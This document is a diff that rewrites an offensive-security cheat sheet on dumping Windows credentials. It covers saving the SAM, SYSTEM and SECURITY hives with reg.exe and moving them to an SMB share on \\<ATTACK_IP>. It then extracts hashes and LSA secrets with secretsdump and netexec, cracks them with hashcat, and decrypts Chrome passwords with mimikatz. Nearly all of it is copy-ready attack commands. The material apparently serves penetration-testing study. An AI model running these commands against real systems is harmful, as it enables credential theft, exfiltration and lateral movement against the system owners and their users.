@@ -1,101 +1,124 @@
-### Attacking SAM, SYSTEM, and SECURITY Hives
-
-Dumping registry hives allows for **offline hash cracking**, which avoids the need to maintain an active session on the target. This technique is used after gaining **local administrative access**.
-
-#### Registry Hive Reference
-
-|Registry Hive|Description|
-|:--|:--|
-|**HKLM\SAM**|Contains password hashes for **local user accounts**.|
-|**HKLM\SYSTEM**|Stores the **system boot key** required to decrypt the SAM database.|
-|**HKLM\SECURITY**|Contains **LSA secrets**, cached domain credentials (**DCC2**), and **DPAPI** keys.|
+1. Got local admin shell? Dump registry hives for offline analysis to avoid maintaining active sessions.
+2. Need to move files to attack host? Spin up a listener and push files via SMB.
+3. Files exfiltrated? Use offline tools to extract NT hashes, LSA secrets, and DPAPI keys.
+4. Remote admin creds but no shell? Dump SAM and LSA secrets over the network.
+5. Captured hashes? Identify type (NT vs DCC2) and crack based on speed/priority.
 
 ---
 
-#### Operational Workflow: Manual Offline Extraction
+## Local Registry Hive Extraction
 
-This method is used to manually exfiltrate hive files when you have interactive shell access.
+Gaining local administrative access allows dumping the SAM, SYSTEM, and SECURITY hives for offline decryption.
 
-1. **Save Registry Hives**: Use `reg.exe` to create copies of the hives on the local filesystem.
-    
-    ```
-    reg.exe save hklm\sam C:\sam.save
-    reg.exe save hklm\system C:\system.save
-    reg.exe save hklm\security C:\security.save
-    ```
-    
-2. **Prepare Attack Host**: Start an SMB server to receive the files. Use the `-smb2support` flag to ensure compatibility with modern Windows systems where SMBv1 is disabled.
-    
-    ```
-    sudo python3 smbserver.py -smb2support <SHARE_NAME> <LOCAL_DIRECTORY_PATH>
-    ```
-    
-3. **Exfiltrate Hives**: Move the saved files from the target to the attack host share.
-    
-    ```
-    move sam.save \\<ATTACK_IP>\<SHARE_NAME>
-    move system.save \\<ATTACK_IP>\<SHARE_NAME>
-    move security.save \\<ATTACK_IP>\<SHARE_NAME>
-    ```
-    
-4. **Extract Hashes Offline**: Use `secretsdump.py` to process the hives. The tool automatically retrieves the boot key from the SYSTEM hive to decrypt the SAM and SECURITY data.
-    
-    ```
-    python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
-    ```
-    
-
----
-
-#### Remote Extraction Workflow
-
-If you possess **local administrator credentials**, you can dump secrets remotely over the network without manual file movement.
-
-|Goal|Command|
-|:--|:--|
-|**Dump SAM Hashes**|`netexec smb <TARGET_IP> --local-auth -u <USERNAME> -p <PASSWORD> --sam`|
-|**Dump LSA Secrets**|`netexec smb <TARGET_IP> --local-auth -u <USERNAME> -p <PASSWORD> --lsa`|
-
-- **Attack Implication**: Dumping **LSA secrets** can reveal credentials for running services, scheduled tasks, and applications.
-
----
-
-#### Password Cracking with Hashcat
-
-Once hashes are extracted, they are placed in a file for offline cracking.
-
-|Hash Type|Hashcat Mode|Characteristics|
-|:--|:--|:--|
-|**NT (NTLM)**|`1000`|Standard for modern Windows; fast to crack.|
-|**DCC2**|`2100`|Cached domain credentials; uses PBKDF2; **~800x slower** to crack than NT.|
-
-**Cracking Commands:**
+**Commands** Save the local SAM database containing user password hashes
 
 ```
-# Crack NT hashes
-sudo hashcat -m 1000 <HASH_FILE> <WORDLIST_PATH>
-
-# Crack DCC2 hashes
-hashcat -m 2100 <DCC2_HASH_OR_FILE> <WORDLIST_PATH>
+reg.exe save hklm\sam <FILE_PATH>\sam.save
 ```
 
-- **Note**: DCC2 hashes **cannot** be used for Pass-the-Hash attacks.
-
----
-
-#### Data Protection API (DPAPI)
-
-DPAPI is used by Windows and third-party apps to encrypt data on a per-user basis.
-
-**Common DPAPI Applications:**
-
-- **Browsers**: Internet Explorer and Google Chrome (saved passwords).
-- **Communications**: Outlook (email passwords).
-- **Connectivity**: Remote Desktop Connection and Credential Manager (VPNs, Wireless, shares).
-
-**Manual Decryption Example (Chrome):** Use `mimikatz` to decrypt saved browser credentials once the DPAPI keys are obtained from the SECURITY hive.
+Save the SYSTEM hive to extract the boot key required for SAM decryption
 
 ```
-mimikatz.exe
-dpapi::chrome /in:"C:\Users\<USERNAME>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+reg.exe save hklm\system <FILE_PATH>\system.save
 ```
+
+Save the SECURITY hive to extract cached domain credentials (DCC2) and LSA secrets
+
+```
+reg.exe save hklm\security <FILE_PATH>\security.save
+```
+
+**Gotchas** **Administrative privileges** are mandatory; these commands will fail in a standard user context.
+
+## Exfiltration via SMB Share
+
+Moving exfiltrated registry hives to the attack host via an SMB share.
+
+**Commands** Start an SMB server on the attack host compatible with modern Windows versions
+
+```
+sudo python3 smbserver.py -smb2support <SHARE_NAME> <FILE_PATH>
+```
+
+Transfer the saved hive files from the target to the attacker share
+
+```
+move <FILE_PATH> \\<ATTACK_IP>\<SHARE_NAME>
+```
+
+**Dangerous / misconfigured settings**
+
+- Missing the `-smb2support` flag: **Connection will fail** on newer Windows systems because SMBv1 is disabled by default.
+
+## Offline Secret Extraction
+
+Analyzing exfiltrated registry hives on the attack host to extract credentials and keys.
+
+**Commands** Extract all local hashes, LSA secrets, and DPAPI keys from exfiltrated hives
+
+```
+python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+
+**Gotchas** **Missing SYSTEM hive**: The SAM database cannot be decrypted without the boot key stored in the SYSTEM hive.
+
+## Remote Credential Dumping
+
+Extracting secrets over the network using valid local administrator credentials.
+
+**Commands** Dump local SAM hashes remotely using valid credentials
+
+```
+netexec smb <TARGET_IP> --local-auth -u <USERNAME> -p <PASSWORD> --sam
+```
+
+Extract LSA secrets, DPAPI keys, and cached credentials remotely
+
+```
+netexec smb <TARGET_IP> --local-auth -u <USERNAME> -p <PASSWORD> --lsa
+```
+
+**Edge cases**
+
+- Use `netexec` when you have credentials but lack an interactive shell or want to avoid uploading tools to the target.
+
+## Password Cracking
+
+Cracking extracted NT and DCC2 hashes using wordlists.
+
+**Commands** Crack NT hashes (standard local Windows passwords)
+
+```
+hashcat -m 1000 <FILE_PATH> /usr/share/wordlists/rockyou.txt
+```
+
+Crack DCC2 hashes (Domain Cached Credentials)
+
+```
+hashcat -m 2100 '<HASH>' /usr/share/wordlists/rockyou.txt
+```
+
+**Tool comparison**
+
+- NT Hashes: Fast cracking speed; useful for immediate lateral movement.
+- DCC2 Hashes: **800x slower** than NT hashes; use only if NT hashes are unavailable or uncrackable.
+
+**Gotchas** **DCC2 limitations**: These hashes cannot be used for Pass-the-Hash attacks.
+
+## DPAPI Decryption
+
+Decrypting data blobs protected by the Data Protection API, such as stored browser passwords.
+
+### Mimikatz
+
+**Commands** Decrypt stored Google Chrome passwords using DPAPI
+
+```
+mimikatz.exe "dpapi::chrome /in:\"<FILE_PATH>\" /unprotect"
+```
+
+**Edge cases**
+
+- DPAPI is used by Chrome, IE, Outlook, and RDP for credential storage; target these files if registry hashes yield no results.
+
+> ⚠️ Gap: The source does not specify that the `reg.exe save` command may fail if the target file path is currently in use or protected by specific security software, though it notes the requirement for administrative privileges.
